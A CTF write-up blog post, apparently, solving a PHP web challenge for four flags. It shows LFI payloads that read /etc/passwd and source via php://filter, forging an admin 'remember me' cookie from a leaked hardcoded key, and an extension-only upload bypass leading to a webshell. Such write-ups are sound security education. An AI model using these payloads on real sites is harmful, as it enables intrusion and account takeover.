<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="24H@CTF - Jamais Sans Mon Riz" /><meta name="author" content="h3xit" /><meta property="og:locale" content="en" /><meta name="description" content="Challenge Description" /><meta property="og:description" content="Challenge Description" /><link rel="canonical" href="https://h3xitsec.github.io/posts/polyctf-jamaissansmonriz/" /><meta property="og:url" content="https://h3xitsec.github.io/posts/polyctf-jamaissansmonriz/" /><meta property="og:site_name" content="h3xit’s ~" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-15T00:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="24H@CTF - Jamais Sans Mon Riz" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@h3xit" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"h3xit"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://h3xitsec.github.io/posts/polyctf-jamaissansmonriz/"},"description":"Challenge Description","url":"https://h3xitsec.github.io/posts/polyctf-jamaissansmonriz/","@type":"BlogPosting","headline":"24H@CTF - Jamais Sans Mon Riz","dateModified":"2022-02-16T09:45:57-05:00","datePublished":"2022-02-15T00:00:00-05:00","@context":"https://schema.org"}</script><title>24H@CTF - Jamais Sans Mon Riz | h3xit's ~</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="h3xit's ~"><meta name="application-name" content="h3xit's ~"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">h3xit's ~</a></div><div class="site-subtitle font-italic">CTF Writeups and other stuff about my journey into cybersecurity</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/h3xitsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['h3xit','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>24H@CTF - Jamais Sans Mon Riz</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>24H@CTF - Jamais Sans Mon Riz</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/h3xitsec">h3xit</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-02-15 00:00:00 -0500" data-toggle="tooltip" data-placement="bottom" title="Tue, Feb 15, 2022, 12:00 AM -0500" >Feb 15</em> </span> <span> Updated <em class="timeago" date="2022-02-16 09:45:57 -0500 " data-toggle="tooltip" data-placement="bottom" title="Wed, Feb 16, 2022, 9:45 AM -0500" >Feb 16</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1825 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><h1 id="challenge-description">Challenge Description</h1><p>“Jamais sans mon riz” was the web track designed by <a href="https://www.desjardins.com">Desjardins</a> at the 2022 edition of PolyHx’s 24H@CTF</p><p>At the time or writing this, the challenge was still available at <a href="http://www.jamaissansmonriz.com">http://www.jamaissansmonriz.com</a></p><h1 id="flag-1">Flag #1</h1><p>We are presented with a blog about rice. I started by browsing the site manually. Quickly, something catches my attention: links to blog post are in the form of <em>/post.php?postid=posts/1.php</em>. This looks good for a potential LFI vulnerability.</p><p>I continued looking for the “classics” and found the first flag in the good old robots.txt</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>User-agent: * 
Disallow: /admin/

FLAG{1_dur_dur_detre_un_robot}
</pre></table></code></div></div><h1 id="flag-2">Flag #2</h1><p>Now that I have flag #1, I continued to look at source code and some other things without finding anything else useful, I went back to this potential LFI.</p><p>I started by trying to include a file that I know it exists and that I have read permission, robots.txt and it worked. The content of the file showed up in the source :</p><p><em>/post.php?postid=robots.txt</em></p><p><img data-src="/assets/img/polyctf-jamaissansmonriz/lfi1.png" alt="lfi" title="lfi" data-proofer-ignore></p><p>Then I tried to include passwd file which is outside the site root folder. Again, it worked :</p><p><em>/post.php?postid=/etc/passwd</em></p><p><img data-src="/assets/img/polyctf-jamaissansmonriz/lfi2.png" alt="lfi2" title="lfi2" data-proofer-ignore></p><p>Next thing I wanted to see was the site PHP source. But if I include the file through LFI, PHP code will be executed by the server so I wont be able to see what I want to see. So I used php filters to encode the content</p><p><em>/post.php?postid=php://filter/convert.base64-encode/resource=index.php</em></p><p>This will give me a base64 string which I decoded with :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'BIGDIRTYBASE64STRING'</span>|base64 <span class="nt">-d</span> <span class="o">&gt;</span> index.php
</pre></table></code></div></div><p>The decoded string is the actual PHP file. I remembered seeing an admin endpoint in the robots.txt file. I browsed to that endpoint and got redirected to /admin/login.php. By doing the same thing I did for index.php, I got the source for that login page.</p><p>At the top of the page were a comment with the second flag:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="c1">// FLAG{2_je_me_sens_tellement_inclu}</span>

<span class="k">include_once</span><span class="p">(</span><span class="s2">"lib/crypto.php"</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>

<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">])</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /admin/index.php"</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// Validate Remember Me</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"remember_me"</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$remember_me</span> <span class="o">=</span> <span class="nf">validate_remember_me_cookie</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"remember_me"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /admin/index.php"</span><span class="p">);</span>
        <span class="k">exit</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="c1">// Validate login</span>

<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"email"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">]))</span> <span class="p">{</span>
    <span class="c1">// TODO: Ajouter une base de donnees, comme ca on ne riz plus</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"email"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"admin@jamaissansmonriz.com"</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">]</span> <span class="o">===</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">"FLAG4"</span><span class="p">))</span> <span class="p">{</span>
        
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>

        <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"remember_me"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"remember_me"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"on"</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">setcookie</span><span class="p">(</span><span class="s2">"remember_me"</span><span class="p">,</span> <span class="nf">generate_remember_me_cookie</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">],</span> <span class="s2">"1"</span><span class="p">),</span> <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="o">*</span><span class="mi">24</span><span class="o">*</span><span class="mi">30</span><span class="p">,</span> <span class="s2">"/"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="p">}</span>   
        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /admin/index.php"</span><span class="p">);</span>
        <span class="k">exit</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>

</pre></table></code></div></div><p>We also have the code that validate the “remember me” cookie and the login validation itself. We know the admin email address and that the password is stored in an environment variable. We’ll get back to this later.</p><h1 id="flag-3">Flag #3</h1><p>Let’s go back to the source of login.php.</p><p>The website does validate a “remember me” cookie :</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="c1">// Validate Remember Me</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"remember_me"</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$remember_me</span> <span class="o">=</span> <span class="nf">validate_remember_me_cookie</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"remember_me"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"admin"</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /admin/index.php"</span><span class="p">);</span>
        <span class="k">exit</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>What this piece of code do is look for a cookie named “remember_me” and calls a function named “validate_remember_me_cookie”. If the cookie is validated, the user’s session is set to admin.</p><p>We can see in the source that it includes lib/crypto.php. Let’s follow that trail and look at this one</p><p><em>/post.php?postid=php://filter/convert.base64-encode/resource=admin/lib/crypto.php</em></p><p>This one is interesting :</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="nv">$key</span> <span class="o">=</span> <span class="s2">"5UP3R_S3CURE,K3Y"</span><span class="p">;</span>
<span class="nv">$cipher</span><span class="o">=</span><span class="s2">"AES-128-CBC"</span><span class="p">;</span>

<span class="k">function</span> <span class="n">generate_remember_me_cookie</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$admin</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$iv</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">mt_rand</span><span class="p">()),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
    <span class="nv">$t</span> <span class="o">=</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="mi">3600</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">365</span><span class="p">);</span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$username</span> <span class="mf">.</span> <span class="s2">"|"</span> <span class="mf">.</span> <span class="nv">$t</span> <span class="mf">.</span> <span class="s2">"|"</span> <span class="mf">.</span> <span class="nv">$admin</span><span class="p">;</span>
    <span class="k">return</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nf">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"|"</span> <span class="mf">.</span> <span class="nv">$iv</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">validate_remember_me_cookie</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">global</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$cipher</span><span class="p">;</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="nv">$cookie_expended</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"|"</span><span class="p">,</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">));</span>
        <span class="nv">$decrypted_cookie</span> <span class="o">=</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$cookie_expended</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$cookie_expended</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$decrypted_cookie</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nv">$exp_d_cookie</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"|"</span><span class="p">,</span> <span class="nv">$decrypted_cookie</span><span class="p">);</span>
        
        <span class="k">if</span> <span class="p">(</span><span class="nv">$exp_d_cookie</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="nb">time</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="c1">// TODO: Ajouter des comptes user</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$exp_d_cookie</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">"1"</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nv">$exp_d_cookie</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">global</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$cipher</span><span class="p">;</span>
    <span class="c1">// $ciphertext_raw = openssl_encrypt($data, $cipher, $key, 0, $iv);</span>
    <span class="c1">// return base64_encode(ciphertext_raw);</span>
    <span class="k">return</span> <span class="nb">openssl_encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$cipher</span><span class="p">,</span> <span class="nv">$key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">decrypt</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">global</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$cipher</span><span class="p">;</span>
    <span class="c1">// $ciphertext_raw = base64_decode($cookie);</span>
    <span class="c1">// return openssl_decrypt($ciphertext_raw, $cipher, $key, 0, $iv);</span>
    <span class="k">return</span> <span class="nb">openssl_decrypt</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">,</span> <span class="nv">$cipher</span><span class="p">,</span> <span class="nv">$key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>I quickly realised that the functions in this file are the ones responsible for generating and validating “remember me” cookie. Both the key and the cipher used are also there. I had everything I needed to craft myself a cookie.</p><p>I started by launching a php-cli container and copied the file content (without the first and last lines) in the console to load the functions :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nv">$ </span>docker run <span class="nt">--rm</span> <span class="nt">-it</span> php 
Interactive shell

php <span class="o">&gt;</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s2">"5UP3R_S3CURE,K3Y"</span><span class="p">;</span>
<span class="nv">$cipher</span><span class="o">=</span><span class="s2">"AES-128-CBC"</span><span class="p">;</span>

<span class="k">function </span>generate_remember_me_cookie<span class="o">(</span><span class="nv">$username</span>, <span class="nv">$admin</span><span class="o">)</span> <span class="o">{</span>
    <span class="nv">$iv</span> <span class="o">=</span> substr<span class="o">(</span>md5<span class="o">(</span>mt_rand<span class="o">())</span>, 0, 16<span class="o">)</span><span class="p">;</span>
    <span class="nv">$t</span> <span class="o">=</span> <span class="nb">time</span><span class="o">()</span> + <span class="o">(</span>3600 <span class="k">*</span> 24 <span class="k">*</span> 365<span class="o">)</span><span class="p">;</span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$username</span> <span class="nb">.</span> <span class="s2">"|"</span> <span class="nb">.</span> <span class="nv">$t</span> <span class="nb">.</span> <span class="s2">"|"</span> <span class="nb">.</span> <span class="nv">$admin</span><span class="p">;</span>
<span class="o">[</span>...]

php <span class="o">&gt;</span> <span class="nb">echo </span>generate_remember_me_cookie<span class="o">(</span><span class="s1">'admin'</span>,1<span class="o">)</span><span class="p">;</span>
<span class="nv">RVVCK1I1WFFwN3k3a2lRTW1tN1pBSm5WZHRod2pmS1Y2eEtmVnR4Wmd5RT18OGNjNDY4MWE3ZDVmNTg4Nw</span><span class="o">==</span>
</pre></table></code></div></div><p>Now all I had to do is set this cookie in my browser to access the admin page :</p><p>I browsed to /admin/login.php, opened developper tools (f12), go to console tab and run the command:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="dl">'</span><span class="s1">remember_me=RVVCK1I1WFFwN3k3a2lRTW1tN1pBSm5WZHRod2pmS1Y2eEtmVnR4Wmd5RT18OGNjNDY4MWE3ZDVmNTg4Nw==</span><span class="dl">'</span>
</pre></table></code></div></div><p>When the page is reloaded, we’re in the admin dashboard:</p><p><img data-src="/assets/img/polyctf-jamaissansmonriz/admin-flag3.png" alt="flag3" title="flag3" data-proofer-ignore></p><h1 id="flag-4">Flag #4</h1><p>I already know that the 4th flag is in an environment variable. I must find a way to access those variables.</p><p>I tried to get RCE through log poisoning but I couldn’t access any log file. There must be another way to get RCE. I also tried to access the environment variable from /proc/self/environ with no luck.</p><p>I started by browsing the admin dashboard and found a file upload page. Thanks to LFI, we can see the code that’s responsible for the upload :</p><p><em>/post.php?postid=php://filter/convert.base64-encode/resource=admin/upload.php</em></p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="s1">'/var/www/uploads/'</span> <span class="mf">.</span> <span class="nb">session_id</span><span class="p">()</span> <span class="mf">.</span> <span class="s1">'/'</span><span class="p">;</span>
        <span class="nv">$path_parts</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]);</span>
        <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$path_parts</span><span class="p">[</span><span class="s1">'basename'</span><span class="p">];</span>
        <span class="nv">$valid_ext</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"jpg"</span><span class="p">,</span> <span class="s2">"png"</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$path_parts</span><span class="p">[</span><span class="s1">'extension'</span><span class="p">],</span> <span class="nv">$valid_ext</span><span class="p">,</span> <span class="kc">true</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$uploaddir</span><span class="p">))</span> <span class="p">{</span>
                <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$uploaddir</span><span class="p">,</span> <span class="mo">0755</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> <span class="mf">.</span> <span class="nv">$filename</span><span class="p">;</span>
            
            <span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="nv">$uploadfile</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s1">'&lt;div class="alert alert-success" role="alert"&gt; File is valid, and was successfully and securely uploaded.&lt;/div&gt;'</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s1">'&lt;div class="alert alert-danger" role="alert"&gt;What did you do... I\'m not mad, I\'m just disappointed...&lt;/div&gt;'</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">'&lt;div class="alert alert-danger" role="alert"&gt;What did you do... I\'m not mad, I\'m just disappointed...&lt;/div&gt;'</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>By analysing the code, I can tell that the only validation that’s done on the uploaded file is an extension check and that the file is saved in uploads/sessionsid/file.png. We should be able to run some PHP code</p><p>I fired up Burp Suite to edit the upload POST request to remove the image and include some PHP code :</p><p><img data-src="/assets/img/polyctf-jamaissansmonriz/burp-upload.png" alt="burpupload1" title="burpupload1" data-proofer-ignore></p><p>With my file uploaded, I should be able to get to it using LFI :</p><p><em>/post.php?postid=../uploads/c26452f59a9ce0ef22dd3a400aed40c2/cochondinde.jpg</em></p><p><img data-src="/assets/img/polyctf-jamaissansmonriz/rce.png" alt="rce" title="rce" data-proofer-ignore></p><p>Yay! The next thing I did was to upload a proper webshell. I used this one. To do this, I just repeated my first upload POST in Burp Suite and replaced the code with the webshell.</p><p><img data-src="/assets/img/polyctf-jamaissansmonriz/burp-uploadshell.png" alt="burpshell" title="burpshell" data-proofer-ignore></p><p>I went back to my browser and refresh the page to get my shell and the 4th flag :</p><p><img data-src="/assets/img/polyctf-jamaissansmonriz/webshell.png" alt="webshell" title="webshell" data-proofer-ignore></p><h1 